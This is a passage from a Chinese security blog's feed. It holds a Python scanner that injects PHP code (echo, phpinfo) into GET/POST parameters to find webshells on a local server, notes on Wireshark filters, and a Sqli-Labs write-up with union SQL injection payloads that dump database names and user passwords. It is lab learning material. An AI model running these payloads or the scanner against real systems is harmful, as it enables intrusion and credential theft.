function">storefile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">'.DS_Store'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">'index.html'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        nameList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(k)</span><span class="token comment" spellcheck="true">#分离文件名 给每个线程分一个</span><span class="token keyword">def</span> <span class="token function">separateName</span><span class="token punctuation">(</span>threadCount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">,</span>threadCount<span class="token punctuation">)</span><span class="token punctuation">:</span>        nameSepList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nameList<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>threadCount<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#多线程函数</span><span class="token keyword">def</span> <span class="token function">multithreading</span><span class="token punctuation">(</span>threadCount<span class="token punctuation">)</span><span class="token punctuation">:</span>    separateName<span class="token punctuation">(</span>threadCount<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#先分离</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>threadCount<span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run_one_thread<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>nameSepList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#每个线程的运作 参数为文件名称的列表</span><span class="token keyword">def</span> <span class="token function">run_one_thread</span><span class="token punctuation">(</span>name_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> name_list<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>filePath <span class="token operator">+</span> k<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#threadLock.acquire()</span>            <span class="token keyword">global</span> file_count            file_count<span class="token operator">+=</span><span class="token number">1</span>            <span class="token comment" spellcheck="true">#threadLock.release()</span>            <span class="token comment" spellcheck="true">#print('已经完成: {:.2%}'.format(file_count/len(files)))      </span>            content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            get <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"GET\['(.+?)'\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#post = re.findall(r"POST\['(.+?)'\]", content)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> get<span class="token punctuation">:</span>                 <span class="token comment" spellcheck="true">#print('已经完成: {:.2%}'.format(file_count/len(files))+' FileName：'+k+'  ParamName:'+i)</span>                 get_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span> i<span class="token punctuation">)</span>            f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#做GET请求</span><span class="token keyword">def</span> <span class="token function">get_rep</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r_url <span class="token operator">=</span> url <span class="token operator">+</span> filename <span class="token operator">+</span>  <span class="token string">"?"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=echo 'Hello Kitty';"</span>    <span class="token comment" spellcheck="true">#print(r_url)</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>r_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'Hello Kitty'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Record_To_File<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Record_To_File</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    answer <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'answer.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: _GET[\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']"</span><span class="token operator">+</span><span class="token string">" Need time :"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"s\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: _GET[\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']"</span><span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    storefile<span class="token punctuation">(</span><span class="token punctuation">)</span>    multithreading<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span></code></pre><p>优化了一波，减少了多线程，但是递归文件查找,还有assert的改进</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queuefile_count <span class="token operator">=</span> <span class="token number">0</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1"</span>url_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#存储名字名称列表</span>nameSepList<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#存储分分离后的文件名称列表</span><span class="token comment" spellcheck="true">#把文件名存储起来 过滤拿到我们想要的文件后缀</span>threadLock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>base_dir<span class="token operator">=</span><span class="token string">'E:/CodingSoftware/PhpStudy/PHPTutorial/WWW'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base_url: "</span><span class="token operator">+</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base_dir: "</span><span class="token operator">+</span>base_dir<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_url_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base_url<span class="token operator">=</span>url    work_dir <span class="token operator">=</span> base_dir    length<span class="token operator">=</span>len<span class="token punctuation">(</span>work_dir<span class="token punctuation">)</span>    <span class="token keyword">for</span> parent<span class="token punctuation">,</span> dirnames<span class="token punctuation">,</span> filenames <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>work_dir<span class="token punctuation">,</span>  followlinks<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> filenames<span class="token punctuation">:</span>            file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>parent<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print('文件名：%s' % filename)</span>            file_path1<span class="token operator">=</span>file_path<span class="token punctuation">[</span>length<span class="token punctuation">:</span><span class="token punctuation">]</span>            file_path2<span class="token operator">=</span>file_path1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> file_path2<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.php'</span><span class="token punctuation">)</span> <span class="token operator">and</span>  <span class="token punctuation">(</span><span class="token string">'phpMyAdmin'</span> <span class="token operator">not</span> <span class="token keyword">in</span> file_path2<span class="token punctuation">)</span><span class="token punctuation">:</span>                url_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>base_url<span class="token operator">+</span>file_path2<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#print(base_url+file_path2)</span><span class="token comment" spellcheck="true">#每个线程的运作 参数为文件名称的列表</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>name_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> name_list<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(k)</span>        obj_path<span class="token operator">=</span>k<span class="token punctuation">[</span>len<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        file_path<span class="token operator">=</span>base_dir<span class="token operator">+</span>obj_path        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> open<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                get <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"GET\['([A-Za-z_-]+?)'\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>                get1 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"GET\[\"([A-Za-z_-]+?)\"\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>                get2 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"GET\[([A-Za-z_-]+?)\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>                post <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"POST\['([A-Za-z_-]+?)'\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>                post1 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"POST\[\"([A-Za-z_-]+?)\"\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>                post2 <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"POST\[([A-Za-z_-]+?)\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> get<span class="token punctuation">:</span>                    get_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>obj_path<span class="token operator">+</span><span class="token string">" Key is: "</span><span class="token operator">+</span>i<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> get1<span class="token punctuation">:</span>                    get_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>obj_path<span class="token operator">+</span><span class="token string">" Key is: "</span><span class="token operator">+</span>i<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> get2<span class="token punctuation">:</span>                    get_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>obj_path<span class="token operator">+</span><span class="token string">" Key is: "</span><span class="token operator">+</span>i<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> post<span class="token punctuation">:</span>                    post_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>obj_path<span class="token operator">+</span><span class="token string">" Key is: "</span><span class="token operator">+</span>i<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> post1<span class="token punctuation">:</span>                    post_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>obj_path<span class="token operator">+</span><span class="token string">" Key is: "</span><span class="token operator">+</span>i<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> post2<span class="token punctuation">:</span>                    post_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>obj_path<span class="token operator">+</span><span class="token string">" Key is: "</span><span class="token operator">+</span>i<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> e<span class="token comment" spellcheck="true">#做GET请求</span><span class="token keyword">def</span> <span class="token function">get_rep</span><span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r_url <span class="token operator">=</span> base_url <span class="token operator">+</span>  <span class="token string">"?"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=echo 'Hello Kitty';"</span>    <span class="token comment" spellcheck="true">#print(r_url)</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>r_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'Hello Kitty'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Record_To_File<span class="token punctuation">(</span>r_url<span class="token punctuation">,</span>name<span class="token punctuation">)</span>    r_url <span class="token operator">=</span> base_url <span class="token operator">+</span>  <span class="token string">"?"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=phpinfo();"</span> <span class="token comment" spellcheck="true">#预防assert函数</span>    <span class="token comment" spellcheck="true">#print(r_url)</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>r_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'PHP Version'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Record_To_File<span class="token punctuation">(</span>r_url<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post_rep</span><span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r_url <span class="token operator">=</span> base_url     param <span class="token operator">=</span> <span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">"echo 'HelloKitty';"</span>    <span class="token punctuation">}</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>r_url<span class="token punctuation">,</span> data<span class="token operator">=</span>param<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(r_url + " POST: " + name)</span>    <span class="token keyword">if</span> <span class="token string">'HelloKitty'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Record_To_File<span class="token punctuation">(</span>r_url<span class="token punctuation">,</span>name<span class="token punctuation">)</span>    param <span class="token operator">=</span> <span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">"phpinfo();"</span>    <span class="token punctuation">}</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>r_url<span class="token punctuation">,</span> data<span class="token operator">=</span>param<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(r_url + " POST: " + name)</span>    <span class="token keyword">if</span> <span class="token string">'PHP Version'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Record_To_File<span class="token punctuation">(</span>r_url<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Record_To_File</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    answer <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'answer.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: [\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: [\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']"</span><span class="token punctuation">)</span>    answer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_url_list<span class="token punctuation">(</span><span class="token punctuation">)</span>    run<span class="token punctuation">(</span>url_list<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> 多线程 </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark数据包分析实战</title>
      <link href="/2019/05/05/wireshark-shu-ju-bao-fen-xi-shi-zhan/"/>
      <url>/2019/05/05/wireshark-shu-ju-bao-fen-xi-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h3><p>书名Wireshark数据包分析实战第二版译者是诸葛建伟老师orz,有很多一部分讲协议分析的，这里主要记录一下Wireshark工具的使用，捕捉和显示过滤器的规则。<br><a href="https://www.wireshark.org/docs/wsug_html_chunked/index.html" target="_blank" rel="noopener">Wireshark官方文档</a></p><h3 id="二、整本书概括"><a href="#二、整本书概括" class="headerlink" title="二、整本书概括"></a>二、整本书概括</h3><p><img src="2.png" alt=""></p><a id="more"></a><h3 id="三、监听网络线路"><a href="#三、监听网络线路" class="headerlink" title="三、监听网络线路"></a>三、监听网络线路</h3><p>1.混杂模式是从网络线路上查看所有流量的模式，即使流量不是发给本机的。正常的情况可以收到arp协议发送的广播包。</p><p>2.在集线器连接的网络中嗅探可以看到所有的流量，但是同一时刻只有一个设备可以通信，现在不常见，经常会产生冲突。</p><p>3.在交换式网络中嗅探：（正常的可视范围是本机数据包和广播数据包）</p><h3 id="四、一些基本操作"><a href="#四、一些基本操作" class="headerlink" title="四、一些基本操作"></a>四、一些基本操作</h3><p>1.主界面：packet list、packet details、packet bytes</p><p>2.设置首选项：edit-&gt;preferences</p><p>3.着色规则：view-&gt;coloring rules 可以使用明显的颜色来标记关注的流量</p><p>4.查找：ctrl+F （Ctrl+B/N 前后切换）</p><p>5.标记：Ctrl+M （Shift+Ctrl+B/N 前后切换）</p><h3 id="五、高级特性"><a href="#五、高级特性" class="headerlink" title="五、高级特性"></a>五、高级特性</h3><p>1.查看端点、会话信息 Statistics-&gt;endpoints/conversations</p><p>2.查看协议分布情况、占的比重 Statistics-&gt;Protocol Hierarchy</p><p>3.名字解析即一个用来将其地址转化成名字的协议，可能会失败，会带来额外的开销，额外的流量，每次打开一个捕获文件就要重新解析一次。</p><p>4.协议解析即将原始的比特流翻译成wireshark程序识别的协议并显示出来。比如员工用了443端口来传输ftp流量，wireshark会以ssl解析器来显示。这时，可以强制更换解析器：右键，decode as。可以查看解析器的源码来了解解析的过程，安装程序目录：epan/dissectors/。</p><p>5.跟踪TCP流可以将TCP流重组成易读的形式。</p><p>6.查看数据包的长度可以了解到是控制流量比较多还是上传下载的流量比较多。</p><p>7.图形显示：</p><p>IO图IO Graph：看系统某时刻的吞吐量，看不同协议的流量传输的时间走势。<br>双向时间图TCP-&gt;Round Trip Time：显示某个数据包一个RTT占用的时间，用来找到通信中的瓶颈。<br>数据流图Flow Graph：将ip端口之间的交流可视化，比如可以直观的展示TCP三次握手。<br>8.专家信息：可以用来统计数据包中某些特定状态的警告。如：tcp重传输，重复ack等。</p><h3 id="六、两种过滤器"><a href="#六、两种过滤器" class="headerlink" title="六、两种过滤器"></a>六、两种过滤器</h3><p>捕捉过滤器（CaptureFilters）：用于决定将什么样的信息记录在捕捉结果中。需要在开始捕捉前设置。<br>显示过滤器（DisplayFilters）：在捕捉结果中进行详细查找。他们可以在得到捕捉结果后随意修改。</p><h4 id="捕捉过滤器"><a href="#捕捉过滤器" class="headerlink" title="捕捉过滤器"></a>捕捉过滤器</h4><p><img src="1.png" alt=""></p><h5 id="Protocol（协议）"><a href="#Protocol（协议）" class="headerlink" title="Protocol（协议）:"></a>Protocol（协议）:</h5><p>可能的值: ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp.<br>如果没有特别指明是什么协议，则默认使用所有支持的协议。</p><h5 id="Direction（方向）"><a href="#Direction（方向）" class="headerlink" title="Direction（方向）:"></a>Direction（方向）:</h5><p>可能的值: src, dst, src and dst, src or dst<br>如果没有特别指明来源或目的地，则默认使用 &ldquo;src or dst&rdquo; 作为关键字。<br>例如，&rdquo;host 10.2.2.2&Prime;与&rdquo;src or dst host 10.2.2.2&Prime;是一样的。</p><h5 id="Host-s"><a href="#Host-s" class="headerlink" title="Host(s):"></a>Host(s):</h5><p>可能的值： net, port, host, portrange.<br>如果没有指定此值，则默认使用&rdquo;host&rdquo;关键字。<br>例如，&rdquo;src 10.1.1.1&Prime;与&rdquo;src host 10.1.1.1&Prime;相同。</p><h5 id="Logical-Operations（逻辑运算）"><a href="#Logical-Operations（逻辑运算）" class="headerlink" title="Logical Operations（逻辑运算）:"></a>Logical Operations（逻辑运算）:</h5><p>可能的值：not, and, or.<br>否(&ldquo;not&rdquo;)具有最高的优先级。或(&ldquo;or&rdquo;)和与(&ldquo;and&rdquo;)具有相同的优先级，运算时从左至右进行。</p><h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><pre><code>tcp dst port 3128  //捕捉目的TCP端口为3128的封包。ip src host 10.1.1.1  //捕捉来源IP地址为10.1.1.1的封包。host 10.1.2.3  //捕捉目的或来源IP地址为10.1.2.3的封包。ether host e0-05-c5-44-b1-3c //捕捉目的或来源MAC地址为e0-05-c5-44-b1-3c的封包。如果你想抓本机与所有外网通讯的数据包时，可以将这里的mac地址换成路由的mac地址即可。src portrange 2000-2500  //捕捉来源为UDP或TCP，并且端口号在2000至2500范围内的封包。not imcp  //显示除了icmp以外的所有封包。（icmp通常被ping工具使用）src host 10.7.2.12 and not dst net 10.200.0.0/16 //显示来源IP地址为10.7.2.12，但目的地不是10.200.0.0/16的封包。(src host 10.4.1.12 or src net 10.6.0.0/16) and tcp dst portrange 200-10000 and dst net 10.0.0.0/8  //捕捉来源IP为10.4.1.12或者来源网络为10.6.0.0/16，目的地TCP端口号在200至10000之间，并且目的位于网络 10.0.0.0/8内的所有封包。src net 192.168.0.0/24 src net 192.168.0.0 mask 255.255.255.0  //捕捉源地址为192.168.0.0网络内的所有封包。</code></pre><h4 id="显示过滤器"><a href="#显示过滤器" class="headerlink" title="显示过滤器"></a>显示过滤器</h4><h5 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h5><pre><code>snmp || dns || icmp //显示SNMP或DNS或ICMP封包。 ip.addr == 10.1.1.1  //显示来源或目的IP地址为10.1.1.1的封包。ip.src != 10.1.2.3 or ip.dst != 10.4.5.6  //显示来源不为10.1.2.3或者目的不为10.4.5.6的封包。ip.src != 10.1.2.3 and ip.dst != 10.4.5.6  //显示来源不为10.1.2.3并且目的IP不为10.4.5.6的封包。tcp.port == 25  //显示来源或目的TCP端口号为25的封包。 tcp.dstport == 25  //显示目的TCP端口号为25的封包。 tcp.flags  //显示包含TCP标志的封包。 tcp.flags.syn == 0&amp;times;02  //显示包含TCP SYN标志的封包。 </code></pre>]]></content>
      
      
      <categories>
          
          <category> Wireshark数据包分析实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-Labs</title>
      <link href="/2019/04/27/sqli-labs/"/>
      <url>/2019/04/27/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h3><p>第2~4题和Less-1的差不多其实，到了第五题,第六题开始盲注有点难了，学了一波mysql的操作还是有些收获</p><h3 id="二、Hack"><a href="#二、Hack" class="headerlink" title="二、Hack"></a>二、Hack</h3><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>传入一个单引号试探注入点，发现报错</p><pre><code>..... syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><a id="more"></a><p>推测和Less-1唯一的区别在于没有单引号，只是用数字进行查询，例如</p><pre><code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code></pre><p>所以payload和Less-1差别只在于一个单引号</p><pre><code>-1 union select 1,2,3 %23-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23-1 union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>题目名字叫，Single quotes with twist string (基于错误的GET单引号变形字符型注入)<br>测试 ?id=1’ 得到</p><pre><code>...... syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>猜测语句</p><pre><code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></pre><p>所以通过前面加 -1’) 闭合前面 尾部加%23 （#的url编码）中间就可以为所欲为了</p><pre><code>SELECT * FROM users WHERE id=(&#39;   -1&#39;){{为所欲为}}#23    &#39;) LIMIT 0,1</code></pre><p>所以payload</p><pre><code>-1&#39;)union select 1,2,3 %23-1&#39;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&#39;-1&#39;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23-1&#39;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23-1&#39;)union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>尝试’并未发现报错，尝试”发现报错</p><pre><code>syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>猜测语句</p><pre><code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></pre><p>所以payload和3差不多只是单引号变双引号</p><pre><code>-1&quot;)union select 1,2,3 %23-1&quot;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&#39;-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23-1&quot;)union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-5-在导航页里显示的是要使用双查询"><a href="#Less-5-在导航页里显示的是要使用双查询" class="headerlink" title="Less-5 在导航页里显示的是要使用双查询"></a>Less-5 在导航页里显示的是要使用双查询</h4><p>发现正常或者注入成功是这样的<br><img src="12.png" 